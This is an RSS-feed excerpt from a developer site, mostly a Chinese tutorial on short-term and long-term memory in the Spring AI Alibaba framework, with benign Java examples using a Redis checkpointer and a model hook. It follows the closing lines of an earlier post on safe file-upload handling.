<p>ç¬¬å››ï¼Œå®‰å…¨å¤„ç†æ–‡ä»¶ä¸Šä¼ ã€‚æˆ‘ä¼šé™åˆ¶æ–‡ä»¶ç±»å‹ã€å¤§å°ï¼Œç”Ÿæˆå®‰å…¨æ–‡ä»¶åï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶æ”¾åœ¨éWebè®¿é—®ç›®å½•ã€‚</p>
</blockquote>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼šç¨‹åºå‘˜å¤§åï¼Œä¸“æ³¨åˆ†äº«å‰åç«¯å¼€å‘çš„å®æˆ˜ç¬”è®°ã€‚å…³æ³¨æˆ‘ï¼Œå°‘èµ°å¼¯è·¯ï¼Œä¸€èµ·è¿›æ­¥ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€ç«™å¼äº†è§£Spring AI Alibabaçš„Memoryæœºåˆ¶]]></title>    <link>https://juejin.cn/post/7596990822127566886</link>    <guid>https://juejin.cn/post/7596990822127566886</guid>    <pubDate>2026-01-20T05:47:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596990822127566886" data-draft-id="7596990822127026214" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€ç«™å¼äº†è§£Spring AI Alibabaçš„Memoryæœºåˆ¶"/> <meta itemprop="keywords" content="åç«¯,äººå·¥æ™ºèƒ½,æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-20T05:47:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æƒ³ç”¨offeræ‰“ç‰Œ"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€ç«™å¼äº†è§£Spring AI Alibabaçš„Memoryæœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æƒ³ç”¨offeræ‰“ç‰Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T05:47:57.000Z" title="Tue Jan 20 2026 05:47:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>æˆ‘ç›¸ä¿¡å¤§å®¶åœ¨å¹³æ—¶ä¸€å®šä½¿ç”¨è¿‡ç½‘é¡µå¯¹è¯chatbotï¼Œå›½äº§çš„æœ‰deepseekã€Qwenç­‰ï¼Œå›½å¤–çš„æœ‰ChatGPTã€Geminiã€Grokç­‰ã€‚åœ¨æˆ‘ä»¬ä½¿ç”¨çš„æœŸé—´ï¼Œæˆ‘ä»¬ä¼šå‘ç°è¿™äº›chatbotä¼šè®°ä½æˆ‘ä»¬è¿™æ¬¡å¯¹è¯çš„ä¸Šä¸‹æ–‡ï¼Œç”šè‡³ä¹‹å‰çš„å¯¹è¯çš„æŸäº›ä¿¡æ¯ï¼Œå¦‚æœä½ ä»¬å¯¹ä¸ºä»€ä¹ˆLLMèƒ½è®°ä½æˆ‘ä»¬çš„ä¿¡æ¯æ„Ÿå…´è¶£ï¼Œé‚£ä¹ˆæ¥ç€å¾€ä¸‹çœ‹å§ï¼</p>
<h2 data-id="heading-1">é”™è¯¯çº æ­£</h2>
<p>å¾ˆå¤šäººä¸äº†è§£å¤§æ¨¡å‹æˆ–è€…ä¸äº†è§£å¤§æ¨¡å‹åº”ç”¨å¼€å‘çš„ï¼Œå°±å¸¸å¸¸è®¤ä¸ºå¤§æ¨¡å‹åº•å±‚å°±æ˜¯ä¼šæœ‰è®°å¿†æœºåˆ¶çš„ï¼Œå³å†…ç½®Memoryã€‚è¿™ç§æƒ³æ³•æ˜¯é”™è¯¯çš„ï¼Œå¤§æ¨¡å‹åº•å±‚å¹¶æ²¡æœ‰è®°å¿†æœºåˆ¶ï¼Œè€Œæ˜¯stateless(æ— çŠ¶æ€)ã€‚</p>
<p>1.åŸºç¡€å¤§æ¨¡å‹ï¼ˆå¦‚ Qwenï¼‰çš„è¡Œä¸º(LLM)</p>
<ul>
<li>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¤§è¯­è¨€æ¨¡å‹ï¼ˆåŒ…æ‹¬ Qwen ç³»åˆ—ï¼‰æ˜¯<strong>æ— çŠ¶æ€çš„</strong>ï¼šæ¯æ¬¡è¯·æ±‚éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ¨¡å‹ä¸ä¼šè‡ªåŠ¨è®°ä½ä½ ä¹‹å‰çš„å¯¹è¯å†…å®¹ã€‚</li>
<li>å¦‚æœä½ åœ¨ä¸€æ¬¡å¯¹è¯ä¸­å‘é€å¤šè½®æ¶ˆæ¯ï¼ˆä¾‹å¦‚é€šè¿‡ API çš„ <code>messages</code> å­—æ®µä¼ å…¥å†å²ï¼‰ï¼Œé‚£æ˜¯ç”±<strong>è°ƒç”¨æ–¹</strong>ï¼ˆå³ä½ çš„åº”ç”¨ï¼‰è´Ÿè´£ç»´æŠ¤å¯¹è¯å†å²ï¼Œè€Œä¸æ˜¯æ¨¡å‹è‡ªå·±å­˜å‚¨ã€‚</li>
</ul>
<p>2.Memory æœºåˆ¶æ˜¯åº”ç”¨å±‚çš„åŠŸèƒ½</p>
<ul>
<li>â€œMemoryâ€é€šå¸¸æ˜¯æŒ‡åœ¨æ„å»ºæ™ºèƒ½ä½“ï¼ˆAgentï¼‰æˆ–å¯¹è¯ç³»ç»Ÿæ—¶ï¼Œä¸ºäº†å®ç°ä¸Šä¸‹æ–‡è®°å¿†ã€é•¿æœŸè®°å¿†ã€ç”¨æˆ·åå¥½è®°å½•ç­‰åŠŸèƒ½è€Œ<strong>é¢å¤–å¼•å…¥çš„æ¨¡å—</strong>ã€‚</li>
<li>ä¾‹å¦‚ï¼Œåœ¨ LangChainã€LlamaIndex æˆ–é˜¿é‡Œäº‘ç™¾ç‚¼å¹³å°ä¸­ï¼Œå¼€å‘è€…å¯ä»¥é…ç½®çŸ­æœŸè®°å¿†ï¼ˆå¦‚æœ€è¿‘å‡ è½®å¯¹è¯ï¼‰æˆ–é•¿æœŸè®°å¿†ï¼ˆå¦‚å‘é‡æ•°æ®åº“å­˜å‚¨çš„å†å²ä¿¡æ¯ï¼‰ï¼Œå¹¶åœ¨æ¯æ¬¡ç”Ÿæˆå›å¤å‰å°†ç›¸å…³è®°å¿†æ³¨å…¥ promptã€‚</li>
<li>è¿™ç§ Memory ç®¡ç†æ˜¯ç”±<strong>åº”ç”¨æ¡†æ¶æˆ–å¼€å‘è€…ä»£ç </strong>å®ç°çš„ï¼Œä¸æ˜¯æ¨¡å‹åŸç”Ÿèƒ½åŠ›ã€‚</li>
</ul>
<h2 data-id="heading-2">Memory</h2>
<p>é‚£ä¹ˆåƒchatbotè¿™äº›å¤§æ¨¡å‹åº”ç”¨ï¼Œæ˜¯å¦‚ä½•ç»´æŒè®°å¿†å‘¢ï¼Ÿé‚£ä¹ˆç»´æŠ¤è®°å¿†ä¸‡ä¸€è¶…è¿‡äº†æ¨¡å‹èƒ½æ‰¿å—çš„ä¸Šä¸‹æ–‡ï¼Œæ€ä¹ˆåŠï¼Ÿ</p>
<p>è¦äº†è§£è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆå¾—ææ‡‚ï¼Œ<strong>ä»€ä¹ˆæ˜¯Memory</strong>ã€‚</p>
<p>Memoryåˆ†ä¸ºçŸ­æœŸè®°å¿†å’Œé•¿æœŸè®°å¿†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åˆ†åˆ«è¯´è¯´ï¼Œå°½é‡ç®€å•æ˜“æ‡‚ã€‚</p>
<h3 data-id="heading-3">çŸ­æœŸMemory</h3>
<p>çŸ­æœŸè®°å¿†ï¼ˆShort-term Memoryï¼‰</p>
<ul>
<li>
<p><strong>å®šä¹‰</strong>ï¼šæŒ‡åœ¨<strong>å•æ¬¡å¯¹è¯ä¼šè¯ï¼ˆsessionï¼‰ä¸­</strong>ä¿ç•™çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</p>
</li>
<li>
<p><strong>å…¸å‹å®ç°</strong>ï¼šå°†ç”¨æˆ·ä¸ç³»ç»Ÿå•æ¬¡ä¼šè¯ä¸­çš„æœ€è¿‘å‡ è½®çš„å¯¹è¯å†å²ï¼ˆprompt + responseï¼‰ä½œä¸ºä¸Šä¸‹æ–‡ï¼Œä¸€èµ·è¾“å…¥ç»™å¤§æ¨¡å‹ã€‚</p>
</li>
<li>
<p>ç‰¹ç‚¹ï¼š</p>
<ul>
<li>ä»…åœ¨å½“å‰ä¼šè¯æœ‰æ•ˆï¼›</li>
<li>ä¼šè¯ç»“æŸåé€šå¸¸è¢«ä¸¢å¼ƒï¼ˆé™¤éä¸»åŠ¨ä¿å­˜ï¼‰ï¼›</li>
<li>å—é™äºæ¨¡å‹çš„ä¸Šä¸‹æ–‡é•¿åº¦ï¼ˆå¦‚ Qwen-Max æ”¯æŒ 32768 tokensï¼‰ï¼›</li>
<li>æ˜¯å®ç°å¤šè½®å¯¹è¯è¿è´¯æ€§çš„åŸºç¡€ã€‚</li>
</ul>
</li>
<li>
<p>ä¾‹å­ï¼š</p>
<blockquote>
<p>ç”¨æˆ·ï¼šæˆ‘å«å°æ˜ã€‚ åŠ©æ‰‹ï¼šä½ å¥½ï¼Œå°æ˜ï¼ ç”¨æˆ·ï¼šæˆ‘ä»Šå¹´å¤šå¤§ï¼Ÿ â†’ åŠ©æ‰‹èƒ½å›ç­”ï¼Œæ˜¯å› ä¸ºâ€œæˆ‘å«å°æ˜â€è¿™å¥è¿˜åœ¨çŸ­æœŸè®°å¿†ï¼ˆå³å¯¹è¯å†å²ï¼‰ä¸­</p>
</blockquote>
</li>
</ul>
<p>çŸ­æœŸè®°å¿†ä¸€èˆ¬å¤§æ¨¡å‹åº”ç”¨éƒ½ä¼šè‡ªåŠ¨å¼€å¯çš„ï¼Œä½†æ˜¯æ¯ä¸ªåº”ç”¨å¯¹çŸ­æœŸè®°å¿†çš„ç­–ç•¥éƒ½ä¼šä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä½“éªŒä¸Šä¹Ÿä¸ä¸€æ ·ã€‚</p>
<h3 data-id="heading-4">é•¿æœŸMemory</h3>
<p>é•¿æœŸè®°å¿†ï¼ˆLong-term Memoryï¼‰</p>
<ul>
<li>
<p><strong>å®šä¹‰</strong>ï¼šè·¨è¶Š<strong>å¤šä¸ªä¼šè¯</strong>ã€æŒä¹…åŒ–å­˜å‚¨çš„ç”¨æˆ·ä¿¡æ¯æˆ–äº¤äº’å†å²ã€‚</p>
</li>
<li>
<p>å…¸å‹å®ç°ï¼š</p>
<ul>
<li>å°†å…³é”®ä¿¡æ¯ï¼ˆå¦‚ç”¨æˆ·åå¥½ã€èº«ä»½ã€å†å²ä»»åŠ¡ï¼‰æå–åå­˜å…¥æ•°æ®åº“æˆ–å‘é‡åº“ï¼›</li>
<li>ä¸‹æ¬¡å¯¹è¯æ—¶é€šè¿‡æ£€ç´¢ï¼ˆRetrievalï¼‰æœºåˆ¶å¬å›ç›¸å…³å†…å®¹ï¼Œå¹¶æ³¨å…¥åˆ° prompt ä¸­ã€‚</li>
</ul>
</li>
<li>
<p>ç‰¹ç‚¹ï¼š</p>
<ul>
<li>éœ€è¦æ˜¾å¼è®¾è®¡ï¼ˆå¦‚ä½¿ç”¨å‘é‡æ•°æ®åº“ + embedding æ£€ç´¢ï¼‰ï¼›</li>
<li>ä¸æ˜¯æ‰€æœ‰ç³»ç»Ÿéƒ½é»˜è®¤å¼€å¯ï¼›</li>
<li>æ¶‰åŠéšç§å’Œæ•°æ®å®‰å…¨ï¼Œé€šå¸¸éœ€ç”¨æˆ·æˆæƒï¼›</li>
<li>å±äºé«˜çº§åŠŸèƒ½ï¼Œå¸¸è§äºæ™ºèƒ½ä½“ï¼ˆAgentï¼‰æˆ–ä¸ªæ€§åŒ–åŠ©æ‰‹ã€‚</li>
</ul>
</li>
<li>
<p>ä¾‹å­ï¼š</p>
<blockquote>
<p>ä¸Šå‘¨ç”¨æˆ·è¯´ï¼šâ€œæˆ‘å–œæ¬¢å–ç¾å¼å’–å•¡ã€‚â€ ä¸€å‘¨åå†æ¬¡å¯¹è¯ï¼Œç³»ç»Ÿè¯´ï¼šâ€œä»Šå¤©è¿˜æƒ³æ¥ä¸€æ¯ç¾å¼å—ï¼Ÿâ€ â†’ è¿™è¯´æ˜ç³»ç»Ÿé€šè¿‡é•¿æœŸè®°å¿†è®°ä½äº†åå¥½ã€‚</p>
</blockquote>
</li>
</ul>
<p>ä»¥Geminiä¸ºä¾‹å­ï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ æƒ³è®©Geminiè®°ä½ä½ çš„ç›¸å…³ä¿¡æ¯ï¼Œæˆ–è€…åœ¨æŸæ¬¡å¯¹è¯ä¸­ç›´æ¥promptè®©å…¶è®°ä½ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚è¿™æ ·å°±æ˜¯é•¿æœŸMemoryï¼Œæ¯æ¬¡Geminiéƒ½ä¼šåœ¨æŸäº›æƒ…æ™¯ä¸‹è§¦å‘ç›¸å…³çš„é•¿æœŸè®°å¿†ï¼Œç­–ç•¥ä¸åŒï¼Œè¾“å‡ºä¹Ÿä¼šä¸åŒ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb3439edfb8d46f1a93120640aff551c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oOz55Sob2ZmZXLmiZPniYw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769492876&amp;x-signature=2IM1STkkuLy7QVhx6EVKAuLUWiM%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">SAAçš„Memoryæœºåˆ¶</h2>
<p>okï¼Œç°åœ¨å›å½’æ­£é¢˜ï¼Œæ¥è®²è®²SAAçš„Memoryæœºåˆ¶ï¼Œå¦‚æœè¿˜æœ‰æƒ³æœ‰æ›´æ·±çš„äº†è§£çš„å…„å¼Ÿå¯ä»¥å…ˆå»çœ‹çœ‹è¿™ä¸¤ç¯‡æ–‡ç« ï¼Œå†å›æ¥åº”è¯¥èƒ½æ›´å¥½çš„ç†è§£</p>
<p>1.Spring AI vs Spring AI Alibaba</p>
<p><a href="https://juejin.cn/post/7596181746062508059" target="_blank" title="https://juejin.cn/post/7596181746062508059">juejin.cn/post/759618â€¦</a></p>
<p>2.é€ƒå‡ºç»“æ„åŒ–æ€ç»´ï¼šä»å‘é‡ï¼Œå‘é‡æ•°æ®åº“åˆ°RAG</p>
<p><a href="https://juejin.cn/post/7587074669818134554" target="_blank" title="https://juejin.cn/post/7587074669818134554">juejin.cn/post/758707â€¦</a></p>
<p>SAAæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªAIåº”ç”¨å¼€å‘æ¡†æ¶ï¼Œå¯ä»¥å¼€å‘agentï¼Œmulti-agentå’Œå·¥ä½œæµç­‰ç­‰ï¼Œé‚£ä¹ˆå¿…ç„¶éœ€è¦ä½¿ç”¨åº•å±‚LLMï¼Œç„¶è€Œæˆ‘ä»¬å‰é¢å·²ç»è¯´è¿‡äº†LLMå®é™…ä¸Šæ˜¯æ— çŠ¶æ€çš„ï¼Œé‚£ä¹ˆLLMåº”ç”¨çš„ç›¸å…³è®°å¿†å¿…å®šæ˜¯ç”±æˆ‘ä»¬ä¸Šå±‚åº”ç”¨æ¥å¼€å‘å’Œç®¡ç†çš„ã€‚</p>
<p>å³å¦‚æœä½ ä½¿ç”¨çš„æ˜¯Â <strong>Qwen çš„ APIï¼ˆå¦‚ dashscopeï¼‰</strong> ï¼Œä½ éœ€è¦è‡ªå·±ç»´æŠ¤å¯¹è¯å†å²å¹¶ä½œä¸ºè¾“å…¥ä¼ å…¥ã€‚</p>
<h3 data-id="heading-6">SAAçš„Memoryæœºåˆ¶çš„æ¶æ„</h3>
<p>ä¸‹é¢æ˜¯SAAå®ç°ä¸¤ç§Memoryçš„æ¶æ„å›¾,å…¶ä¸­å·¦ä¸‹è§’çš„ç®­å¤´(æŒ‡å‘ModelHook)åº”è¯¥æ”¾ç½®åˆ°ä¸­é—´çš„ï¼Œç”»é”™äº†å°±å°†å°±çœ‹å§</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18a0e499cf7e49fea80e248203b7e7f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oOz55Sob2ZmZXLmiZPniYw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769492876&amp;x-signature=8R8dwVnosD%2BXP9YQwGV3Pq6f%2FQE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">ç»´æŠ¤çŸ­æœŸè®°å¿†</h3>
<h4 data-id="heading-8">å¦‚ä½•æ·»åŠ çŸ­æœŸè®°å¿†</h4>
<p>åœ¨ Spring AI Alibaba ä¸­ï¼Œè¦å‘ Agent æ·»åŠ çŸ­æœŸè®°å¿†ï¼ˆä¼šè¯çº§æŒä¹…åŒ–ï¼‰ï¼Œä½ éœ€è¦åœ¨åˆ›å»º Agent æ—¶æŒ‡å®šÂ <code>checkpointer</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.checkpoint.savers.RedisSaver;
<span class="hljs-keyword">import</span> org.redisson.api.RedissonClient;

<span class="hljs-comment">// é…ç½® Redis checkpointer</span>
<span class="hljs-type">RedisSaver</span> <span class="hljs-variable">redisSaver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisSaver</span>(redissonClient);

<span class="hljs-type">ReactAgent</span> <span class="hljs-variable">agent</span> <span class="hljs-operator">=</span> ReactAgent.builder()
    .name(<span class="hljs-string">"my_agent"</span>)
    .model(chatModel)
    .tools(getUserInfoTool)
    .saver(redisSaver)
    .build();
    
<span class="hljs-comment">// ä½¿ç”¨ thread_id ç»´æŠ¤å¯¹è¯ä¸Šä¸‹æ–‡  </span>
<span class="hljs-type">RunnableConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> RunnableConfig.builder()  
    .threadId(<span class="hljs-string">"1"</span>) <span class="hljs-comment">// threadId æŒ‡å®šä¼šè¯ ID  </span>
    .build();  
  
agent.call(<span class="hljs-string">"ä½ å¥½ï¼æˆ‘å« Bobã€‚"</span>, config);
</code></pre>
<h4 data-id="heading-9">æ‰©å±•çŸ­æœŸè®°å¿†</h4>
<p>æˆ‘ä»¬è¿˜å¯ä»¥ä¿®æ”¹å’Œç®¡ç†è®°å¿†ã€‚
é»˜è®¤æƒ…å†µä¸‹ï¼ŒAgent ä½¿ç”¨çŠ¶æ€é€šè¿‡Â <code>messages</code>Â é”®ç®¡ç†çŸ­æœŸè®°å¿†ï¼Œç‰¹åˆ«æ˜¯å¯¹è¯å†å²ã€‚</p>
<p>ä½ å¯ä»¥é€šè¿‡åœ¨å·¥å…·æˆ– Hook ä¸­è®¿é—®å’Œä¿®æ”¹çŠ¶æ€æ¥æ‰©å±•è®°å¿†åŠŸèƒ½</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.agent.hook.ModelHook;
<span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.agent.hook.HookPosition;
<span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.OverAllState;
<span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.RunnableConfig;
<span class="hljs-keyword">import</span> org.springframework.ai.chat.messages.Message;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.Optional;
<span class="hljs-keyword">import</span> java.util.concurrent.CompletableFuture;

<span class="hljs-comment">// åœ¨ Hook ä¸­è®¿é—®å’Œä¿®æ”¹çŠ¶æ€</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomMemoryHook</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ModelHook</span> {

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"custom_memory"</span>;
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> HookPosition[] getHookPositions() {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HookPosition</span>[]{HookPosition.BEFORE_MODEL};
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> CompletableFuture&lt;Map&lt;String, Object&gt;&gt; <span class="hljs-title function_">beforeModel</span><span class="hljs-params">(OverAllState state, RunnableConfig config)</span> {
    <span class="hljs-comment">// è®¿é—®æ¶ˆæ¯å†å²</span>
    Optional&lt;Object&gt; messagesOpt = state.value(<span class="hljs-string">"messages"</span>);
    <span class="hljs-keyword">if</span> (messagesOpt.isPresent()) {
        List&lt;Message&gt; messages = (List&lt;Message&gt;) messagesOpt.get();
    <span class="hljs-comment">// å¤„ç†æ¶ˆæ¯...</span>
}

    <span class="hljs-comment">// æ·»åŠ è‡ªå®šä¹‰çŠ¶æ€</span>
    <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(Map.of(
        <span class="hljs-string">"user_id"</span>, <span class="hljs-string">"user_123"</span>,
        <span class="hljs-string">"preferences"</span>, Map.of(<span class="hljs-string">"theme"</span>, <span class="hljs-string">"dark"</span>)
    ));
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> CompletableFuture&lt;Map&lt;String, Object&gt;&gt; <span class="hljs-title function_">afterModel</span><span class="hljs-params">(OverAllState state, RunnableConfig config)</span> {
    <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(Map.of());
    }
}
</code></pre>
<h4 data-id="heading-10">ç®¡ç†çŸ­æœŸè®°å¿†</h4>
<p>ä¸€ä¸ªä¼šè¯ä¸­ï¼Œå¦‚æœç”¨æˆ·ä¸€ç›´å¯¹è¯ï¼Œæ•´ä¸ªä¼šè¯çš„ä¸Šä¸‹æ–‡å°±ä¼šè¶Šæ¥è¶Šé•¿ï¼Œæœ€åå°±ä¼šè¶…è¿‡è¯¥å¤§æ¨¡å‹æ‰€èƒ½æ‰¿å—çš„ä¸Šä¸‹æ–‡é™åˆ¶ã€‚</p>
<p>ä¿ç•™æ‰€æœ‰å¯¹è¯å†å²æ˜¯å®ç°çŸ­æœŸè®°å¿†æœ€å¸¸è§çš„å½¢å¼ã€‚ä½†è¾ƒé•¿çš„å¯¹è¯å¯¹å†å²å¯èƒ½ä¼šå¯¼è‡´å¤§æ¨¡å‹ LLM ä¸Šä¸‹æ–‡çª—å£è¶…é™ï¼Œå¯¼è‡´ä¸Šä¸‹æ–‡ä¸¢å¤±æˆ–æŠ¥é”™ã€‚</p>
